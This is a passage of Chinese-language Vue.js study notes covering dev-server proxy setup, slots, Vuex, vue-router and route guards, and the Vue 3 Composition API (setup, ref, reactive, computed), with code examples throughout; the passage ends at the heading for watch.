   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。
   
   

# **第4章： Vue 中的 ajax**

## 4.1. Vue脚手架配置代理

同源：，域名，协议，端口相同。 

跨域：当一个请求 url 的协议、域名、端口三者之间任意一个与当前页面 url 不同即为跨域。

**非同源的客户端脚本在没有明确授权的情况下，不能读写对方资源，在请求数据时，浏览器会在控制台中报一个异常，提示拒绝访问。**



<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309171518648.png"/>

### 方法一

​	在vue.config.js中添加如下配置：

```js
module.exports = {
	devServer:{
  		proxy:"http://localhost:5000"
	}
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：**不能配置多个代理**，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （**优先匹配前端资源**）

### 方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以**配置多个代理**，且可以灵活的**控制请求是否走代理**。
2. 缺点：配置略微繁琐，**请求资源时必须加前缀**。



## 4.2. github 用户搜索案例

### 4.2.1. 效果

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309171550270.png"/>



### 4.2.2. 接口地址

https://api.github.com/search/users?q=xxx



### **4.2.3. vue 项目中常用的 2 个 Ajax 库**

1. **axios**

   通用的 Ajax 请求库, 官方推荐，使用广泛

2. **vue-resource**

   vue 插件库, vue1.x 使用广泛，**官方已不维护。**



## 4.3. slot插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      - 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      - 具体编码：

        ```vue
        父组件中：
        		<Category>
        			<template scope="scopeData">
        				<!-- 生成的是ul列表 -->
        				<ul>
        					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
        				</ul>
        			</template>
        		</Category>
        
        		<Category>
        			<template slot-scope="scopeData">
        				<!-- 生成的是h4标题 -->
        				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
        			</template>
        		</Category>
        子组件中：
                <template>
                    <div>
                        <slot :games="games"></slot>
                    </div>
                </template>
        		
                <script>
                    export default {
                        name:'Category',
                        props:['title'],
                        //数据在子组件自身
                        data() {
                            return {
                                games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                            }
                        },
                    }
                </script>
        ```

   

# 第5章：Vuex

## 5.1. 理解 Vuex

### 5.1.1 vuex 是什么

概念：专门在 Vue 中实现**集中式状态（数据）**管理的一个 Vue **插件**，对 vue 应用中多个组件的**共享状态**进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。



### 5.1.2. 什么时候使用 Vuex

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态



### 5.1.3. 图解

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309171613897.png"/>

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309171613482.png"/>



## 5.2. Vuex的工作原理

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309171705681.png"/>

Vuex 和单纯的全局对象有以下两点不同：

1. Vuex 的状态存储是**响应式**的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态`state`发生变化，那么相应的组件也会相应地得到高效更新。(也就是所谓的MVVM)
2. 你不能直接改变 store 中的状态`state`。改变 store 中的状态的唯一途径就是**显式地提交 (commit) `mutations`**。



工作原理

- `actions`(行为)、`mutations`(变更)、`state`(状态、数据)都是对象，且由`store`管理
- 可以用组件`Vue Components`使用`dispatch`或者后端接口去触发`action`
- 组件中也可以越过`actions`，即不使用`dispatch`，直接使用`commit`，提交`mutations`
- 提交`mutations`后，可以动态的渲染组件`Vue Components`



## 5.3. 搭建vuex环境

1. 创建文件：`src/store/index.js`

   ```js
   //该文件用于创建Vuex中最为核心的store
   
   //引入Vue
   import Vue from 'vue'
   //引入 Vuex
   import Vuex from "vuex"
   //使用Vuex
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   // //创建store
   // const store = new Vuex.Store(actions,mutations,state)
   
   // //导出store
   // export default store
   
   //创建并导出store
   export default new Vuex.Store({actions,mutations,state})
   ```

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   //import store from './store/index.js'
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```

   

## 5.4. 基本使用

1. 初始化数据`state`、配置`actions`、配置`mutations`，操作文件`store.js`

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
   	},
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：`$store.state.sum`

3. 组件中修改vuex中的数据：`$store.dispatch('jia',数据)` 或 `$store.commit('JIA',数据)`

   ```js
   	methods: {
   		increment(){
   			this.$store.commit('JIA',this.n)
   		},
   
   		decrement(){
   			this.$store.commit('JIAN',this.n)
   		},
   
   		incrementOdd(){
   			this.$store.dispatch("jiaOdd",this.n)
   		},
   
   		incrementWait(){
   			this.$store.dispatch("jiaWait",this.n)
   		},
   ```

> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过`actions`，即不写`dispatch`，直接编写`commit`



## 5.5. getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

   



## 5.6. 四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

 

## 5.7. 模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

# 第6章：路由（vue-router）

## 6.1. 相关理解

### 6.1.1 vue-router 的理解

vue 的一个插件库，专门用来实现 **SPA 应用**



### 6.1.2 对 SPA 应用的理解

1. 单页 Web 应用（single page web application，SPA）。
2. 整个应用只有**一个完整的页面**。
3. 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新。**
4. 数据需要通过 ajax 请求获取



### 6.1.3 路由的理解

1. 什么是路由?
   - 一个路由就是一组映射关系（**key - value**）
   - **key 为路径, value 可能是 function 或 component**
2. 路由分类
   1. 后端路由：
      - 理解：value 是 function, 用于**处理客户端提交的请求**
      - 工作过程：服务器接收到一个请求时, 根据**请求路径**找到匹配的**函数**来处理请求, 返回响应数据。
   2. 前端路由：
      - 理解：value 是 component，用于**展示页面内容。**
      - 工作过程：当浏览器的路径改变时, 对应的组件就会显示。



## 6.2. 基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```（在main.js中）

3. 编写router配置项:（router/index.js）

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```



## 6.2. 几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被**销毁掉**的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。



## 6.3. 多级路由（嵌套路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

   

## 6.4. 路由的query参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		    id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

   ```vue
   <ul>
       <li>消息编号：{{$route.query.id}}</li>
       <li>消息标题：{{$route.query.title}}</li>
   </ul>
   ```

## 6.5. 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                            name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                 title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```



## 6.6. 路由的params参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则**不能使用path配置项，必须使用name配置！**

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

   ```vue
   <ul>
       <li>消息编号：{{$route.params.id}}</li>
       <li>消息标题：{{$route.params.title}}</li>
   </ul>
   ```




## 6.7. 路由的props配置

​	作用：让路由组件更方便的收到参数

```js
{
	name:'message',
	path:'detail',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props($route){
		return {
			id:$route.query.id,
			title:$route.query.title
		}
	}
}
```



## 6.8. `<router-link>`的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`，`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`
3. 如何开启`replace`模式：`<router-link replace .......>News</router-link>`



## 6.9. 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   
   this.$router.replace({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```



## 6.10. 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```vue
   <!-- 缓存一个路由组件 -->
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   
   <!-- 缓存多个路由组件 -->
   <keep-alive :include="['News','Message']"> 
       <router-view></router-view>
   </keep-alive>
   
   ```



## 6.11. 两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。



## 6.12. 路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   const router =  new VueRouter({...})
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```




## 6.13. 路由器的两种工作模式



1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。



# **第 7 章：Vue UI 组件库**

## **7.1. 移动端常用 UI 组件库**

1. Vant https://youzan.github.io/vant
2. Cube UI https://didi.github.io/cube-ui
3. Mint UI http://mint-ui.github.io

## **7.2. PC 端常用 UI 组件库**

1. Element UI https://element.eleme.cn
2. IView UI https://www.iviewui.com



# 第8章：Vue3

## 8.1. Vue3简介

- 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）
- 耗时2年多、[2600+次提交](https://github.com/vuejs/vue-next/graphs/commit-activity)、[30+个RFC](https://github.com/vuejs/rfcs/tree/master/active-rfcs)、[600+次PR](https://github.com/vuejs/vue-next/pulls?q=is%3Apr+is%3Amerged+-author%3Aapp%2Fdependabot-preview+)、[99位贡献者](https://github.com/vuejs/vue-next/graphs/contributors) 
- github上的tags地址：https://github.com/vuejs/vue-next/releases/tag/v3.0.0

## 8.2. Vue3带来了什么

### 1.性能的提升

- 打包大小减少41%

- 初次渲染快55%, 更新渲染快133%

- 内存减少54%

  ......

### 2.源码的升级

- 使用Proxy代替defineProperty实现响应式

- 重写虚拟DOM的实现和Tree-Shaking

  ......

### 3.拥抱TypeScript

- Vue3可以更好的支持TypeScript

### 4.新的特性

1. Composition API（组合API）

   - setup配置
   - ref与reactive
   - watch与watchEffect
   - provide与inject
   - ......
2. 新的内置组件
   - Fragment 
   - Teleport
   - Suspense
3. 其他改变

   - 新的生命周期钩子
   - data 选项应始终被声明为一个函数
   - 移除keyCode支持作为 v-on 的修饰符
   - ......

# 第9章：创建Vue3.0工程

## 9.1. 使用 vue-cli 创建

官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建
vue create vue_test
## 启动
cd vue_test
npm run serve
```

## 9.2. 使用 vite 创建

官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite

vite官网：https://vitejs.cn

- 什么是vite？—— 新一代前端构建工具。
- 优势如下：
  - 开发环境中，无需打包操作，可快速的冷启动。
  - 轻量快速的热重载（HMR）。
  - 真正的按需编译，不再等待整个应用编译完成。
- 传统构建 与 vite构建对比图

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310072258670.png" style="width:370px;height:250px;float:left;" /><img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202310072258210.png" style="width:370px;height:250px;" />

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```



# 第10章：常用 Composition API

官方文档: https://v3.cn.vuejs.org/guide/composition-api-introduction.html

## 10.1. setup配置

1. 理解：Vue3.0中一个新的配置项，值为一个函数。
2. setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。
3. 组件中所用到的：数据、方法等等，均要配置在setup中。
4. setup函数的两种返回值：
   1. 若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
   2. <span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span>
5. 注意点：
   1. 尽量不要与Vue2.x配置混用
      - Vue2.x配置（data、methos、computed...）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。
      - 但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed...）。
      - <strong style="color:#DD5145">如果有重名, setup优先</strong>。
   2. setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{name}}</h2>
  <h2>年龄：{{age}}</h2>
  <h2>a的值为：{{a}}</h2>
  <button @click="sayHello">vue3(sayHello)</button>
  <br>
  <button @click="sayWelcome">vue2(sayWelcome)</button>
  <br>
  <button @click="test1">vue2配置中读取vue3中的数据、方法</button>
  <br>
  <button @click="test2">vue3的setup配置中读取vue2中的数据、方法</button>
</template>

<script>
// import {h} from 'vue'
export default {
  name: 'App',
  data(){
    return {
      sex:'男',
      a:100
    }
  },
  methods:{
    sayWelcome(){
      alert("欢迎学习Vue")
    },
    test1(){
      console.log(this.sex);
      console.log(this.name);
      console.log(this.age);
      console.log(this.sayHello);
    }
  },
  setup(){
    //数据
    let name = '张三'
    let age = 18
    let a = 900
    
	//方法
    function sayHello(){
      alert(`我叫${name}，我${age}岁了，你好啊`)
    }
    function test2(){
      console.log(name);
      console.log(age);
      console.log(sayHello);
      console.log(this.sex);
      console.log(this.sayHello);
    }

    // 返回一个对象（常用）
    return{
      name,
      age,
      a,
      sayHello,
      test2
    }

    // 返回一个渲染函数
    // return ()=>h('h1',"尚硅谷")
  }
}
</script>
```



## 10.2. ref函数

- 作用: 定义一个响应式的数据
- 语法: ```const xxx = ref(initValue)``` 
  - 创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。
  - JS中操作数据： ```xxx.value```
  - 模板中读取数据: 不需要.value，直接：```<div>{{xxx}}</div>```
- 备注：
  - 接收的数据可以是：基本类型、也可以是对象类型。
  - 基本类型的数据：响应式依然是靠``Object.defineProperty()``的```get```与```set```完成的。
  - 对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— ```reactive```函数。

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{name}}</h2>
  <h2>年龄：{{age}}</h2>
  <h2>工作总类：{{job.type}}</h2>
  <h2>薪水：{{job.salary}}</h2>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {ref} from 'vue'
export default {
  name: 'App',
  setup(){
    //数据
    let name = ref('张三')
    let age = ref(18)
    let job = ref({
      type: "前端工程师",
      salary:"60k"
    })
    //方法
    function changeInfo(){
      name.value = "李四",
      age.value = 10,
      job.value.type = "后端工程师"
      job.value.salary = "100k"
    }
    return{
      name,
      age,
      job,
      changeInfo
    }
  }
}
</script>

```

## 10.3. reactive函数

- 作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用```ref```函数）
- 语法：```const 代理对象= reactive(源对象)```接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong>
- reactive定义的响应式数据是“深层次的”。
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{person.name}}</h2>
  <h2>年龄：{{person.age}}</h2>
  <h2>工作总类：{{person.job.type}}</h2>
  <h2>薪水：{{person.job.salary}}</h2>
  <h2>爱好：{{person.hobby}}</h2>
  <h2>测试数据c：{{person.job.a.b.c}}</h2>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import {reactive} from 'vue'
export default {
  name: 'App',
  setup(){
    //数据
    let person = reactive({
      name:'张三',
      age:18,
      job:{
        type:'前端工程师',
        salary:'60k',
        a:{
          b:{
            c:666
          }
        }
      },
      hobby:["学习",'游戏']
    })
    //方法
    function changeInfo(){
      person.name = "李四",
      person.age = 10,
      person.job.type = "后端工程师"
      person.job.salary = "100k"
      person.job.a.b.c = 999
      person.hobby[0] = '听歌'
    }
    return{
      person,
      changeInfo
    }
  }
}
</script>
```

## 10.4. Vue3.0中的响应式原理

### vue2.x的响应式

- 实现原理：

  - 对象类型：通过```Object.defineProperty()```对属性的读取、修改进行拦截（数据劫持）。

  - 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。

    ```js
    Object.defineProperty(data, 'count', {
        get () {}, 
        set () {}
    })
    ```

- 存在问题：

  - 新增属性、删除属性, 界面不会更新。
  - 直接通过下标修改数组, 界面不会自动更新。

### Vue3.0的响应式

- 实现原理: 

  - 通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。

  - 通过Reflect（反射）:  对源对象的属性进行操作。

  - MDN文档中描述的Proxy与Reflect：

    - Proxy：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy

    - Reflect：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect

      ```js
      new Proxy(data, {
      	// 拦截读取属性值
          get (target, prop) {
          	return Reflect.get(target, prop)
          },
          // 拦截设置属性值或添加新属性
          set (target, prop, value) {
          	return Reflect.set(target, prop, value)
          },
          // 拦截删除属性
          deleteProperty (target, prop) {
          	return Reflect.deleteProperty(target, prop)
          }
      })
      
      proxy.name = 'tom'   
      ```

## 10.5. reactive对比ref

-  从定义数据角度对比：
   -  ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。
   -  reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。
   -  备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过```reactive```转为<strong style="color:#DD5145">代理对象</strong>。
-  从原理角度对比：
   -  ref通过``Object.defineProperty()``的```get```与```set```来实现响应式（数据劫持）。
   -  reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。
-  从使用角度对比：
   -  ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong>```.value```，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong>```.value```。
   -  reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong>```.value```。



## 10.6. setup的两个注意点

- setup执行的时机
  - 在**beforeCreate之前**执行一次，this是**undefined**。
- setup的参数
  - **props**：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - **context**：上下文对象
    - **attrs**: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - **slots**: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。



## 10.7. 计算属性---computed函数

- 与Vue2.x中computed配置功能一致

- 写法

  ```js
  import {computed} from 'vue'
  
  setup(){
      ...
  	//计算属性——简写
      let fullName = computed(()=>{
          return person.firstName + '-' + person.lastName
      })
      //计算属性——完整
      let fullName = computed({
          get(){
              return person.firstName + '-' + person.lastName
          },
          set(value){
              const nameArr = value.split('-')
              person.firstName = nameArr[0]
              person.lastName = nameArr[1]
          }
      })
  }
  ```

  

## 10.8. 监视

### watch函数

